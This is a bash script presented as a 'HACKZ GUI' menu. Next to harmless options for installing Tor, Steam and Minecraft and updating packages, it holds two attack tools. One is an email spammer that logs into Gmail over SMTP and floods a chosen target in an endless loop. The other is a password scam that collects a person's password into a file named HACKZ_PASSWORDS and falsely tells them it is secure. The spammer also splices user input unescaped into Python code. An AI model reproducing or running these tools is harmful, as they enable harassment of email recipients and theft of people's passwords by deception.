#! /bin/bash

clear

sudo apt-get install dialog

clear

dialog --msgbox "HACKZ GUI. MADE BY HACKERS300112 - iwasneverhere101 - AvexProducts. CURRENT VERSION: 6.0 | Press ENTER to continue" 10 40

enter=$?

if [ "$enter" -eq 0 ]; then
	while true; do

		choices=$(dialog --menu "Select what action you would like to perform: " 20 90 9 \
			1 "Install tor" \
			2 "Install steam" \
			3 "Install minecraft" \
			4 "Update your local package index" \
			5 "Upgrade your packages to the latest version in your local package index" \
			6 "Email Spammer" \
			7 "Password Scam - Potentionally Grab Someones Password" \
			2>&1 >/dev/tty)
		
		exit_status=$?
		
		if [ "$exit_status" -ne 0 ]; then
			dialog --msgbox "Goodbye. " 10 40
			clear
			exit
		fi

		case $choices in
			1) 
				(
    				echo "deb http://ftp.debian.org/debian bookworm main contrib" | sudo tee -a /etc/apt/sources.list.d/cros.list
				echo 20; sleep 1
				echo "deb-src http://ftp.debian.org/debian bookworm main contrib" | sudo tee -a /etc/apt/sources.list.d/cros.list
    				echo 40; sleep 1
				sudo apt-get update -qq > /dev/null 2>&1
    				echo 60; sleep 1
				sudo apt-get upgrade -qq > /dev/null 2>&1
    				echo 80; sleep 1
				sudo apt-get install -y -qq torbrowser-launcher > /dev/null 2>&1
    				echo 100; sleep 1
    				) | dialog --title "Installing Tor Browser..." --gauge "Progress: " 10 70 0 2>&1>/dev/tty
				dialog --msgbox "Tor Browser has been installed. " 10 40 
				;;
			2)
				(
				sudo apt-get update -y -qq > /dev/null 2>&1
				echo 16; sleep 1
				sudo apt-get upgrade -y -qq > /dev/null 2>&1
				echo 33; sleep 1
				sudo apt-get install flatpak -y -qq > /dev/null 2>&1
				echo 50; sleep 1
				sudo apt-get install xorg -y -qq > /dev/null 2>&1
				echo 66; sleep 1
				sudo wget https://dl.flathub.org/repo/appstream/com.valvesoftware.Steam.flatpakref > /dev/null 2>&1
				echo 83; sleep 1
				yes | sudo flatpak install com.valvesoftware.Steam.flatpakref -y > /dev/null 2>&1
				echo 100; sleep 1
				) | dialog --title "Installing steam..." --gauge "Progress: " 10 70 0 2>&1>/dev/tty
				dialog --msgbox "Steam has been installed" 10 40
				;;
			3)
				(
				sudo apt-get install openjdk-17-jdk -y -qq 2>&1
				echo 100; sleep 1 
				java -jar Sklauncher-3.2.10.jar
				) | dialog --title "Installing minecraft..." --gauge "Progress: " 10 70 0 2>&1>/dev/tty
				dialog --msgbox "To later run minecraft, go to this directory and type: sudo java -jar SKlauncher-3.2.10.jar. If any error occured, it is likely blocked although few know about it" 10 40
				dialog --msgbox "Minecraft has been installed." 10 40
				;;
			4)
				(
				sudo apt-get update -qq 2>&1>/dev/null
				echo 100; sleep 1
				) | dialog --title "Updating local package index..." --gauge "Progress: " 10 70 0 2>&1>/dev/tty
    				dialog --msgbox "Your local package index has been updated." 10 40
				;;
			5)
				(
				sudo apt-get upgrade -qq 2>&1>/dev/null
				echo 100; sleep 1
				) | dialog --title "Upgrading packages..." --gauge "Progress: " 10 70 0 2>&1>/dev/tty
    				dialog --msgbox "Your installed packages have been upgraded to the latest version in your local package index" 20 50
				;;
			6)
				dialog --msgbox "MAKE SURE YOUR ACCOUNT HAS LESS-SECURE APPS TURNED ON (JUST A WARNING)" 10 40
				emailofspammer=$(dialog --inputbox "Enter the email you want to spam with: " 10 40 2>&1>/dev/tty)
				passwordofspammer=$(dialog --passwordbox "Enter the password of this spammer email (for logging in and spamming): " 10 40 2>&1>/dev/tty)
				emailbeingspammed=$(dialog --inputbox "Enter the email of the person being spammed" 10 40 2>&1>/dev/tty)
				messagesending=$(dialog --inputbox "Enter the message you want to spam: " 10 40 2>&1>/dev/tty)
				while true; do
					echo "SPAMMING"

					python3 - <<EOF
					
					import smtplib
					
					from email.mime.text import MIMEText
					
					msg=MIMEText('$messagesending')

					msg['From'] = '$emailofspammer'
					msg['To'] = '$emailbeingspammed'
					
					with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
						smtp.starttls()
						smtp.login('$emailofspammer', '$passwordofspammer')
						smtp.send_message(msg)
EOF

					sleep 1
				done
				;;
			7)
				dialog --msgbox "The password scam will work by asking the user to enter their password. It will then store it in a file named: HACKZ_PASSWORDS and tell the user their password is secure (a lie)" 10 40
				password=$(dialog --passwordbox "Enter the password to see if it is secure: " 10 40 2>&1>/dev/tty)
				echo "$password" >> HACKZ_PASSWORDS
				dialog --msgbox "You password is secure" 10 40
				;; 
 		esac
	done


else
	dialog --msgbox "ERROR. PLEASE RESTART THE PROGRAM" 10 40
	exit
fi
